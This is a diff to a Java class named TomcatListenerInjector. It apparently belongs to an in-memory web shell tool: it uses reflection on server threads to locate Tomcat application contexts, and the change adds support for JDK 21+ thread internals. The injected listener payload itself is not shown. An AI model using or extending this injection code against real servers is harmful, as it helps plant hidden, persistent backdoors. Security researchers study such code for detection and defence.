@@ -59,14 +59,22 @@ public class TomcatListenerInjector {
         for (Thread thread : threads) {
             String threadName = thread.getName();
             if (threadName.contains("ContainerBackgroundProcessor")) {
-                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                Object target = getThreadTarget(thread);
+                if (target == null) {
+                    continue;
+                }
+                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(target, "this$0"), "children");
                 for (Object value : childrenMap.values()) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                     contexts.addAll(children.values());
                 }
             } else if (threadName.contains("Poller") && !threadName.contains("ajp")) {
                 try {
-                    Object proto = getFieldValue(getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "handler"), "proto");
+                    Object target = getThreadTarget(thread);
+                    if (target == null) {
+                        continue;
+                    }
+                    Object proto = getFieldValue(getFieldValue(getFieldValue(target, "this$0"), "handler"), "proto");
                     Object engine = getFieldValue(getFieldValue(getFieldValue(getFieldValue(proto, "adapter"), "connector"), "service"), "engine");
                     Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(engine, "children");
                     for (Object value : childrenMap.values()) {
@@ -88,6 +96,18 @@ public class TomcatListenerInjector {
             }
         }
         return contexts;
+    }
+
+    private Object getThreadTarget(Thread thread) throws Exception {
+        Object target = getFieldValue(thread, "target");
+        if (target == null) {
+            // JDK 21+
+            Object holder = getFieldValue(thread, "holder");
+            if (holder != null) {
+                target = getFieldValue(holder, "task");
+            }
+        }
+        return target;
     }
 
     @SuppressWarnings("all")
